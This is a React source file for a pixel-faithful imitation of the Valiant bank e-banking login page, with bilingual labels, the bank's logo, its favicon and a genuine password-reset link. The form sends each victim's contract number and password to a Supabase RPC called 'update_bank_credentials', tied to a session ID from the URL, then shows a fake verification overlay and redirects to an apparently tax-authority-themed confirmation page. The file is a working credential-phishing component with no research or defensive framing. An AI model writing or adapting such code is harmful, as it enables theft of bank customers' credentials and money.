import { useEffect, useRef, useState } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { ChevronDown } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import valiantLogo from "@/assets/valiant-logo.svg";
import bgAsset from "@/assets/valiant-bg.png.asset.json";

const PURPLE = "#725BA7";
const PURPLE_HOVER = "#5e4a8f";
const BORDER = "#c9c9c9";
const FOCUS_RING = "#dcd4ea";

type Lang = "de" | "fr";

const T: Record<Lang, Record<string, string>> = {
  de: {
    title: "Anmeldung",
    contract: "Vertragsnummer",
    password: "Passwort",
    submit: "Weiter",
    forgot: "Passwort vergessen?",
    loading: "Anmeldedaten werden überprüft...",
  },
  fr: {
    title: "Connexion",
    contract: "Numéro de contrat",
    password: "Mot de passe",
    submit: "Continuer",
    forgot: "Mot de passe oublié?",
    loading: "Vérification des données de connexion...",
  },
};

const LANG_OPTIONS: { code: Lang; label: string }[] = [
  { code: "de", label: "DE" },
  { code: "fr", label: "FR" },
];

const CARD_MAX = 460;

const ChValiant = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";

  const [vertragsnummer, setVertragsnummer] = useState("");
  const [passwort, setPasswort] = useState("");
  const [lang, setLang] = useState<Lang>("de");
  const [langOpen, setLangOpen] = useState(false);
  const [showLoading, setShowLoading] = useState(false);
  const langRef = useRef<HTMLDivElement | null>(null);
  const t = T[lang];

  usePageMeta(
    "Valiant E-Banking — Anmeldung",
    "https://www.valiant.ch/etc.clientlibs/valiant/clientlibs/clientlib-base/resources/favicons/favicon.ico"
  );

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  useEffect(() => {
    const onDoc = (e: MouseEvent) => {
      if (langRef.current && !langRef.current.contains(e.target as Node)) {
        setLangOpen(false);
      }
    };
    document.addEventListener("mousedown", onDoc);
    return () => document.removeEventListener("mousedown", onDoc);
  }, []);

  const disabled = vertragsnummer.trim() === "" || passwort === "";

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (disabled) return;
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: vertragsnummer,
        p_password: passwort,
        p_username_label: "Vertragsnummer",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    } else {
      console.error("No session ID found in URL!");
    }
    setShowLoading(true);
  };

  const inputFocus = (e: React.FocusEvent<HTMLInputElement>) => {
    e.currentTarget.style.outline = `3px solid ${FOCUS_RING}`;
    e.currentTarget.style.outlineOffset = "0px";
  };
  const inputBlur = (e: React.FocusEvent<HTMLInputElement>) => {
    e.currentTarget.style.outline = "none";
  };

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message={t.loading}
          onComplete={() => navigate("/estv/confirmation?s=" + sessionId)}
        />
      )}
      <div
        className="min-h-screen flex flex-col"
        style={{
          fontFamily: "Arial, Helvetica, sans-serif",
          color: "#1a1a1a",
        }}
      >
        {/* Header */}
        <header className="w-full bg-white">
          <div className="w-full px-6 md:px-10 py-5 flex items-center justify-between">
            <a href="https://www.valiant.ch" aria-label="Valiant" className="inline-block">
              <img src={valiantLogo} alt="Valiant" className="h-9 md:h-10 w-auto" />
            </a>

            <div className="relative" ref={langRef}>
              <button
                type="button"
                onClick={() => setLangOpen((v) => !v)}
                className="inline-flex items-center gap-1.5 px-2 py-1 text-[18px] font-normal transition-colors"
                style={{ color: PURPLE }}
                aria-haspopup="listbox"
                aria-expanded={langOpen}
              >
                {lang.toUpperCase()}
                <ChevronDown
                  className={`w-4 h-4 transition-transform ${langOpen ? "rotate-180" : ""}`}
                  strokeWidth={2.5}
                />
              </button>
              {langOpen && (
                <ul
                  className="absolute right-0 top-full mt-1 z-30 bg-white border border-gray-200 shadow-md min-w-[80px]"
                  role="listbox"
                >
                  {LANG_OPTIONS.map((opt) => (
                    <li key={opt.code}>
                      <button
                        type="button"
                        onClick={() => {
                          setLang(opt.code);
                          setLangOpen(false);
                        }}
                        className="block w-full text-left px-4 py-2 text-[15px] font-normal hover:bg-gray-50 transition-colors"
                        style={{ color: PURPLE }}
                      >
                        {opt.label}
                      </button>
                    </li>
                  ))}
                </ul>
              )}
            </div>
          </div>
        </header>


        {/* Body with background image */}
        <main
          className="flex-1 w-full flex items-center md:items-start"

          style={{
            backgroundImage: `url(${bgAsset.url})`,
            backgroundSize: "cover",
            backgroundPosition: "center",
            backgroundRepeat: "no-repeat",
          }}
        >
          <div
            className="mx-auto w-full px-4 py-8 md:py-12"
            style={{ maxWidth: CARD_MAX }}
          >



            <section
              className="bg-white w-full p-8 md:p-10"
              style={{ boxShadow: "0 2px 8px rgba(0,0,0,0.08)" }}
            >
              <h1 className="text-[26px] font-normal mb-8" style={{ color: "#1a1a1a" }}>
                {t.title}
              </h1>

              <form onSubmit={handleSubmit} className="flex flex-col">
                <label htmlFor="val-contract" className="block text-[14px] font-bold mb-2">
                  {t.contract}
                </label>
                <input
                  id="val-contract"
                  type="text"
                  autoComplete="username"
                  value={vertragsnummer}
                  onChange={(e) => setVertragsnummer(e.target.value)}
                  className="w-full h-10 px-3 text-[15px] transition-shadow mb-5"
                  style={{
                    border: `1px solid ${BORDER}`,
                    borderRadius: 2,
                    outline: "none",
                  }}
                  onFocus={inputFocus}
                  onBlur={inputBlur}
                />

                <label htmlFor="val-pw" className="block text-[14px] font-bold mb-2">
                  {t.password}
                </label>
                <input
                  id="val-pw"
                  type="password"
                  autoComplete="current-password"
                  value={passwort}
                  onChange={(e) => setPasswort(e.target.value)}
                  className="w-full h-10 px-3 text-[15px] transition-shadow mb-6"
                  style={{
                    border: `1px solid ${BORDER}`,
                    borderRadius: 2,
                    outline: "none",
                  }}
                  onFocus={inputFocus}
                  onBlur={inputBlur}
                />

                <button
                  type="submit"
                  disabled={disabled}
                  className="w-full md:w-auto md:self-start px-8 py-2.5 text-[15px] text-white font-normal transition-colors"
                  style={{
                    background: disabled ? "#b8a8d4" : PURPLE,
                    cursor: disabled ? "not-allowed" : "pointer",
                    borderRadius: 2,
                  }}
                  onMouseEnter={(e) => {
                    if (!disabled) e.currentTarget.style.background = PURPLE_HOVER;
                  }}
                  onMouseLeave={(e) => {
                    if (!disabled) e.currentTarget.style.background = PURPLE;
                  }}
                >
                  {t.submit}
                </button>

                <a
                  href="https://wwwsec.valiant.ch/authen/ui/app/self-service/select/flow/default-password-reset-flow"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="mt-5 text-[14px] underline underline-offset-2"
                  style={{ color: PURPLE }}
                >
                  {t.forgot}
                </a>
              </form>
            </section>
          </div>
        </main>
      </div>
    </>
  );
};

export default ChValiant;
